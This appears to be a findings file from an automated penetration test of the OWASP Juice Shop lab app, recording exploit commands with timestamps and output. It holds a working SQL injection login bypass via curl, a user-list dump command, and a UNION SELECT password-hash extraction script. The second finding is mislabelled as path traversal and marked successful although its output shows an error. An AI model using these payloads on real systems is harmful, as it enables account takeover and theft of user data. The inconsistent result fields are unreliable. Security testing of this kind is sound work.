@@ -1,0 +1,60 @@
+{
+  "sql_injection_juiceshop": {
+    "type": "sql injection",
+    "target": "juiceshop",
+    "details": "Auto-detected SQLi auth bypass at http://juiceshop:3000/rest/user/login. Evidence: {\"authentication\":{\"token\":\"<<JWT_REDACTED>>",
+    "iteration_found": 2,
+    "exploited": true,
+    "exploit_evidence": "cmd: curl -s -X POST http://juiceshop:3000/rest/user/login -H \"Content-Type: application/json\" -d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\":\"<<REDACTED>>\"}' | tee /pentest/output/c638254e-e0b0-4c76-bc7b-6a6c91fc7281/sqli_proof.json; echo; echo \"=== Extracting all users via API ===\" && curl -s http://juiceshop:3000/api/Users | tee /pentest/output/c638254e-e0b0-4c76-bc7b-6a6c91fc7281/users_dump.json | head -10\noutput:\n{\"authentication\":{\"token\":\"<<JWT_REDACTED>>",
+    "attempted": true,
+    "attempt_count": 1,
+    "attempts": [
+      {
+        "iteration": 2,
+        "timestamp": "2026-02-17T05:10:43.129971+00:00",
+        "command": "curl -s -X POST http://juiceshop:3000/rest/user/login -H \"Content-Type: application/json\" -d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\":\"<<REDACTED>>\"}' | tee /pentest/output/c638254e-e0b0-4c76-bc7b-6a6c91fc7281/sqli_proof.json; echo; echo \"=== Extracting all users via API ===\" && curl -s http://juiceshop:3000/api/Users | tee /pentest/output/c638254e-e0b0-4c76-bc7b-6a6c91fc7281/users_dump.json | head -10",
+        "success": true,
+        "exit_code": 0,
+        "evidence": "{\"authentication\":{\"token\":\"<<JWT_REDACTED>>",
+        "technique": "curl_payload"
+      }
+    ],
+    "techniques_tried": [
+      "curl_payload"
+    ],
+    "not_exploitable_reason": "",
+    "proof": "cmd: curl -s -X POST http://juiceshop:3000/rest/user/login -H \"Content-Type: application/json\" -d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\":\"<<REDACTED>>\"}' | tee /pentest/output/c638254e-e0b0-4c76-bc7b-6a6c91fc7281/sqli_proof.json; echo; echo \"=== Extracting all users via API ===\" && curl -s http://juiceshop:3000/api/Users | tee /pentest/output/c638254e-e0b0-4c76-bc7b-6a6c91fc7281/users_dump.json | head -10\noutput:\n{\"authentication\":{\"token\":\"<<JWT_REDACTED>>",
+    "proof_iteration": 2,
+    "claimed_exploit_evidence": "",
+    "iteration_exploited": 2
+  },
+  "path_traversal_juiceshop": {
+    "type": "path traversal",
+    "target": "juiceshop",
+    "details": "Admin JWT token via SQLi bypass: admin@juice-sh.op\n```bash\npython3 << 'PYEOF'\nimport requests\nimport json\nBASE = \"http://172.21.0.5:3000\"\ns = requests.Session()\nprint(\"=== POST-EXPLOIT: EXTRACTING PAS",
+    "iteration_found": 22,
+    "exploited": true,
+    "exploit_evidence": "cmd: python3 << 'PYEOF'\nimport requests\nimport json\nBASE = \"http://172.21.0.5:3000\"\ns = requests.Session()\nprint(\"=== POST-EXPLOIT: EXTRACTING PASSWORD HASHES VIA SQLI ===\")\n# Direct SQL injection to extract passwords\nsqli_payload = {\"email\": \"' UNION SELECT id,email,password,role,'','','','','','','','' FROM Users--\", \"password\": \"<<REDACTED>>\"}\nr = s.post(f\"{BASE}/rest/user/login\", json=sqli_payload)\nprint(f\"UN\noutput:\n=== POST-EXPLOIT: EXTRACTING PASSWORD HASHES VIA SQLI ===\nUNION attempt: 500\n\n=== SEARCH SQLI FOR DATA EXTRACTION ===\nSearch SQLi: 500 - <html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: SQLITE_ERROR: near &quot;UNION&quot;: syntax error</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue",
+    "attempted": true,
+    "attempt_count": 1,
+    "attempts": [
+      {
+        "iteration": 22,
+        "timestamp": "2026-02-17T05:19:06.214445+00:00",
+        "command": "python3 << 'PYEOF'\nimport requests\nimport json\nBASE = \"http://172.21.0.5:3000\"\ns = requests.Session()\nprint(\"=== POST-EXPLOIT: EXTRACTING PASSWORD HASHES VIA SQLI ===\")\n# Direct SQL injection to extract passwords\nsqli_payload = {\"email\": \"' UNION SELECT id,email,password,role,'','','','','','','','' FROM Users--\", \"password\": \"<<REDACTED>>\"}\nr = s.post(f\"{BASE}/rest/user/login\", json=sqli_payload)\nprint(f\"UN",
+        "success": true,
+        "exit_code": 0,
+        "evidence": "=== POST-EXPLOIT: EXTRACTING PASSWORD HASHES VIA SQLI ===\nUNION attempt: 500\n\n=== SEARCH SQLI FOR DATA EXTRACTION ===\nSearch SQLi: 500 - <html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: SQLITE_ERROR: near &quot;UNION&quot;: syntax error</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gra\n\n=== SENSITIVE FILE DISCOVERY ===\n\n[+] FOUND: /ftp/incident-su",
+        "technique": "other"
+      }
+    ],
+    "techniques_tried": [
+      "other"
+    ],
+    "not_exploitable_reason": "",
+    "proof": "cmd: python3 << 'PYEOF'\nimport requests\nimport json\nBASE = \"http://172.21.0.5:3000\"\ns = requests.Session()\nprint(\"=== POST-EXPLOIT: EXTRACTING PASSWORD HASHES VIA SQLI ===\")\n# Direct SQL injection to extract passwords\nsqli_payload = {\"email\": \"' UNION SELECT id,email,password,role,'','','','','','','','' FROM Users--\", \"password\": \"<<REDACTED>>\"}\nr = s.post(f\"{BASE}/rest/user/login\", json=sqli_payload)\nprint(f\"UN\noutput:\n=== POST-EXPLOIT: EXTRACTING PASSWORD HASHES VIA SQLI ===\nUNION attempt: 500\n\n=== SEARCH SQLI FOR DATA EXTRACTION ===\nSearch SQLi: 500 - <html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: SQLITE_ERROR: near &quot;UNION&quot;: syntax error</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue",
+    "proof_iteration": 22,
+    "claimed_exploit_evidence": "Admin JWT token via SQLi bypass: admin@juice-sh.op\n```bash\npython3 << 'PYEOF'\nimport requests\nimport json\nBASE = \"http://172.21.0.5:3000\"\ns = requests.Session()\nprint(\"=== POST-EXPLOIT: EXTRACTING PAS",
+    "iteration_exploited": 22
+  }
+}
